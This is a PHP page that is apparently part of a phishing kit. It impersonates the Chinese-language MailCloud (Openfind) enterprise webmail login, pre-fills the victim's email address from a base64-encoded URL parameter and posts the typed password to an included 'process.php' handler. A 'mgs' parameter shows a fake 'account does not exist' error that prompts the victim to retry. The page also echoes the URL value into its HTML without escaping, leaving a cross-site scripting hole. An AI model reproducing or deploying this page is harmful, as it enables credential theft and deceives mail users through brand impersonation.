<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{
$login = $_GET['login'];

if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 ?><!DOCTYPE html>
<html lang="tw"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>登入 MailCloud - Login</title>
    <meta property="og:description" content="MailCloud企業雲端服務為 Openfind 的企業代管品牌，主要提供郵件代管，及電子郵件相關之歸檔備份、稽核，及雲端備援等相關服務。強大的軟硬體效能搭配國際級電信業者的機房與頻寬管理，至今已提供客戶穩定、安全的雲端運算長達 17 個年頭。維運團隊及管理系統自2009年已通過國際資訊安全ISO27001認證，值得客戶的信賴與託付。">
    <!-- 出現在 fb 的摘要 -->
    <meta property="og:title" content=" MailCloud 企業雲端服務">
    <!-- 這頁標題 -->
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="MailCloud 企業雲端服務 ">
    <meta property="og:image" content="http://www.mailcloud.com.tw/images/og-27.gif">
    <meta name="description" content="MailCloud企業雲端服務為 Openfind 將原本企業代管品牌MailASP更名並擴大服務範圍後推出的雲端新世代服務品牌。強大的軟硬體效能搭配國際級電信業者的機房與頻寬管理，至今已提供客戶穩定、安全的雲端運算長達12個年頭。維運團隊及管理系統自2009年已通過國際資訊安全ISO27001認證，值得客戶信賴。2011年七月MailCloud新品牌發表同時並推出多項全新雲端服務，將永續追求最高的客戶滿意度、持續提供優質的雲端運算服務。">
    <meta name="KeyWords" content="Openfind, MailCloud企業雲端服務, MailCloud, 企業雲端服務, 中小企業, MailASP, 企業信箱代管, 郵件歸檔備份服務, 郵件稽核防護服務, 郵件備援服務, 雲端監控服務, 企業簡訊行銷平台, 郵件主機代管, 企業網站代管, 主管信箱, 信件打包, 資料取回, 郵件代管, 郵件安全, 網站代管, 郵件備份, 雲端備援,電子郵件信譽保護服務, 郵件信譽保護服務,域名保護,外寄防護,電子郵件外寄防護, STMP外寄防護,Email Reputation, SMTP, Email Security, domain name reputation, email reputation monitoring, RBL,RBL remove, Email Delivery IP Monitor, Deliverability, Email Hosting, Email Archiving, Email Security, Email Continuity, Monitoring Service, Marketing Platform, Server Hosting, Web Hosting">
    <link rel="shortcut icon" type="image/x-icon" href="https://www.mailcloud.com.tw/2017/images/favicon.ico">        
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="../MailCloud - Login_files/css.css" type="text/css">
<!--     <link rel="stylesheet" href="css/font-awesome.min.css">
 -->    <link rel="stylesheet" href="../MailCloud - Login_files/bootstrap.css">
    <link rel="stylesheet" href="../MailCloud - Login_files/login.css">
    <script type="text/javascript">
    function do_submit()
    {
        var form = document.form1;

        if ( (form.USERID.value == "") || (form.USERID.value.indexOf("@") == -1) ) {
            alert("請輸入完整的 Email Address，例如: user@yourdomain.com");
            form.USERID.focus();
            return false;
        }

        if ( form.USERID.value.indexOf(' ') >= 0 ) {
            alert("帳號欄位請勿輸入任何空白");
            form.USERID.focus();
            return false;
        }

        if ( form.PASSWD.value == "" ) {
            alert("請輸入密碼!");
            return false;
        }

        form.USERID.value = form.USERID.value.toLowerCase();

        id = (form.USERID.value.split('@'))[0];
        if ( id == form.PASSWD.value ) {
            alert("密碼與帳號相同，請盡速修改!");
        }

        return true;
}
    </script>

     <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="../MailCloud - Login_files/js"></script>
    <script>
    window.dataLayer = window.dataLayer || [];

    function gtag() { dataLayer.push(arguments); }
    gtag('js', new Date());

    gtag('config', 'UA-1089201-12');
    </script>   
</head>

<body onload="document.form1.USERID.focus();">
    <hr class="purple_hr">
    <div class="container">
        <form class="form-signin" method="post" id="signin" name="form1" target="_top" onsubmit="do_submit();">
                <input type="hidden" name="login" value="<?php echo $log; ?>">

          <div class="row">
                <div class="col-sm-2"></div>
              <h2><a href="https://www.mailcloud.com.tw/" target="_blank"><img class="logo img-fluid" src="../MailCloud - Login_files/logo.svg" alt="MailCloud"></a></h2>
              		 <?php if (isset($_GET['mgs'])) {?>
                     
     <a href="../MailCloud - Login_files/logo.svg">logo.svg</a>              <div class="col-sm-10" align="center" style="color:#F00;">
                     <p> 錯誤 -- 使用者帳號不存在，請檢查帳號是否正確 </p>
                     
                </div>   
                     
 		<?php }?>
          </div>
            <div class="form-group row">
                <label for="username" class="col-sm-2 col-form-label">帳號</label>
                <div class="col-sm-10">
                    <input class="form-control" autocomplete="off" id="username" name="USERID" placeholder="必填，請輸入完整 E-mail" readonly value="<?php echo $log; ?>" type="text">
                </div>
            </div>
            <div class="form-group row">
                <label for="password" class="col-sm-2 col-form-label">密碼</label>
                <div class="col-sm-10">
                    <input class="form-control" autocomplete="off" id="password" name="pass" value="" placeholder="必填" type="password" required>
                </div>
            </div>
            <div class="form-group row">
                <div class="col-sm-2"></div>
                <div class="col-sm-10">
                    <button type="submit" class="btn btn-primary btn-block" onclick="return do_submit(); document.form1.submit();">登入</button>
                </div>
            </div>
        </form>
        <p class="text-center">

            <small>Copyright © Openfind Information Technology INC. All rights reserved.</small></p>
        <!--container ends here-->
    </div>


  <!--  <div class="alert alert-light text-center mt-5" role="alert">
        春節期間客戶服務時間公告  &nbsp;
        <a href="https://www.mailcloud.com.tw/urgent_center/" class="btn btn-outline-primary" target="_blank">立即前往</a>
</div>-->







</body></html>
<?php }?>